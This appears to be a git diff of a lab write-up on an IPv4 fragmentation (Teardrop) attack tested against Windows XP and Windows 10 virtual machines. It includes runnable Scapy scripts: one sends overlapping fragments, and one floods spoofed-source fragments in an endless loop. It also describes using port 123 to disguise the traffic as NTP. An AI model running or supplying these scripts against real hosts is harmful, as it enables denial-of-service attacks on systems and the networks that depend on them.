@@ -81,17 +81,16 @@ Script v1: validation of overlap of two 1400 byte packets.
 On the 2nd packet frag=1 (offset of 1 x 8 bytes) is defined, so sistem need to deal with overlap of 1400 bytes.
 	
 ```python
-            from scapy.all import *
-                                                                                        
-            p1 = IP(dst="<Target_IP>")/UDP(sport=123, dport=80)/("A"*1400)                              
-            p2 = IP(dst="<Target_IP>")/("B"*1400)                              
-
-            p1.flags = 1 # More Fragments, also possible to define as flags = "MF"                                                                       
-            p2.frag = 1   #Adjust the offset to a position that causes overlap      
-            p2.proto = 17 #According to IANA, we indicate the protocol to use                   
-                                                                                        
-            send(p1, iface="en0")         
-            send(p2, iface="en0")    
+    from scapy.all import *
+                                                                                
+    p1 = IP(dst="<Target_IP>")/UDP(sport=123, dport=80)/("A"*1400)                              
+    p2 = IP(dst="<Target_IP>")/("B"*1400)                             
+    p1.flags = 1 # More Fragments, also possible to define as flags = "MF"                                                                       
+    p2.frag = 1   #Adjust the offset to a position that causes overlap      
+    p2.proto = 17 #According to IANA, we indicate the protocol to use                   
+                                                                                
+    send(p1, iface="en0")         
+    send(p2, iface="en0")    
 ```                                             
 	Traffic Evidence Captured in Wireshark (Script v1 - Target: windows XP Pro)
 	
@@ -136,24 +135,24 @@ On the 2nd packet frag=1 (offset of 1 x 8 bytes) is defined, so sistem need to d
 	Script v2: automating bulk sending with IP Spoofing (RandIP) to test for resource exaustion when system mantains multiple "incompleted packets" states in memory.
 	
 ```python
-			from scapy.all import *
-			import time
-			import random
-			
-			target = "<TARGET_IP>"
-			interface = "en0"
-			
-			try:
-			    while True:
-			        random_ip = str(RandIP())
-			                
-			        p1 = IP(src=random_ip, dst=target, flags=1, id=66)/UDP(sport=123, dport=80)/("A"*1400)
-			        p2 = IP(src=random_ip, dst=target, frag=1, id=66, proto=17)/("B"*1400)
-			        
-				   send([p1, p2], iface=interface, verbose=False)
-			            
-			except KeyboardInterrupt:
-			    print("\nAttack interrupted.")	
+	from scapy.all import *
+	import time
+	import random
+	
+	target = "<TARGET_IP>"
+	interface = "en0"
+	
+	try:
+	    while True:
+	        random_ip = str(RandIP())
+	                
+	        p1 = IP(src=random_ip, dst=target, flags=1, id=66)/UDP(sport=123, dport=80)/("A"*1400)
+	        p2 = IP(src=random_ip, dst=target, frag=1, id=66, proto=17)/("B"*1400)
+	        
+		   send([p1, p2], iface=interface, verbose=False)
+	            
+	except KeyboardInterrupt:
+	    print("\nAttack interrupted.")	
 ```
 	Traffic Evidence (Script v2 - Target: windows XP Pro)
 	
@@ -235,15 +234,16 @@ On the 2nd packet frag=1 (offset of 1 x 8 bytes) is defined, so sistem need to d
 Wireshark shows that the attack was successful at layer 3 of the TCP/IP model. The first fragment delivers 1408 bytes and the second the rest of the packet, but the second starts at the 8th byte of the packet, meaning it overlaps the first fragment by 1400 bytes. Thus, the system receives two different pieces of data for the same memory space.
 
 ## Impact
-	1. Windows XP Pro (via VM)
+
+**Windows XP Pro (via VM)**
 	
-        ### Windows XP - Idle
+### Windows XP - Idle
 ![XP Idle](https://github.com/olgafedyuk/Network-Attacks/blob/main/Teardrop-IPv4/images/xp-idle.png)
 
-        ### Windows XP - Attack
+### Windows XP - Attack
 ![XP Idle](https://github.com/olgafedyuk/Network-Attacks/blob/main/Teardrop-IPv4/images/xp-attack.png)
 
-	Data comparison at Task Manager reveals operational cost:
+Data comparison at Task Manager reveals operational cost:
 	
 | Metrics            | In Rest (Idle)| During Attack | Impact         |
 |:-------------------|:--------------|:--------------|:---------------|
@@ -254,12 +254,12 @@ Wireshark shows that the attack was successful at layer 3 of the TCP/IP model. T
 	
 The non-paged memory pool does not grow indefinitely until memory is exhausted, therefore it is not vulnerable to this attack.
 	
-	2. Windows 10 Pro
+**Windows 10 Pro**
 	
-        ### Windows 10 - Idle
+### Windows 10 - Idle
 ![XP Idle](https://github.com/olgafedyuk/Network-Attacks/blob/main/Teardrop-IPv4/images/xp-attack.png)
         
-        ### Windows 10 - Attack
+### Windows 10 - Attack
 ![XP Idle](https://github.com/olgafedyuk/Network-Attacks/blob/main/Teardrop-IPv4/images/10-attack.png)
 
 System has reached RAM limit during the attack.
@@ -286,7 +286,6 @@ Both machines where imune to IPv4 Fragmentation Attack immediate crach due non-p
 
 ## Concepts
 
-**Non-paged Pool:** Kernel memory that cannot be moved to disk (to the paging file), it is always stored only in the physical memory. A large non-paged pool size often indicates that there is a memory leak in some system component or device driver. If exhausted, the system crashes. 
+**Non-paged Pool:** Kernel memory that cannot be moved to disk (to the paging file), it is always stored only in the physical memory. A large non-paged pool size often indicates that there is a memory leak in some system component or device driver. If exhausted, the system crashes.
 **Cached:** Cache memory acts as a high-speed bridge between the CPU and RAM. Temporarily holds data and instructions that the CPU is likely to use again soon, minimizing the need to access the slower main memory. https://www.geeksforgeeks.org/computer-science-fundamentals/cache-memory/
-**Port 123 (Use and Evasion):**
-Disguise: NTP protocol port (time). Many firewalls allow this traffic by default, so it works as camuflage. In Wireshark, the analyst sees "NTP" with incorrect dates (e.g., year 2070) and may confuse the attack with a simple synchronization error, masking the DoS.
+**Port 123 (Use and Evasion):** NTP protocol port (time), many firewalls allow this traffic by default, so it works as camuflage. In Wireshark, the analyst sees "NTP" with incorrect dates (e.g., year 2070) and may confuse the attack with a simple synchronization error, masking the DoS.
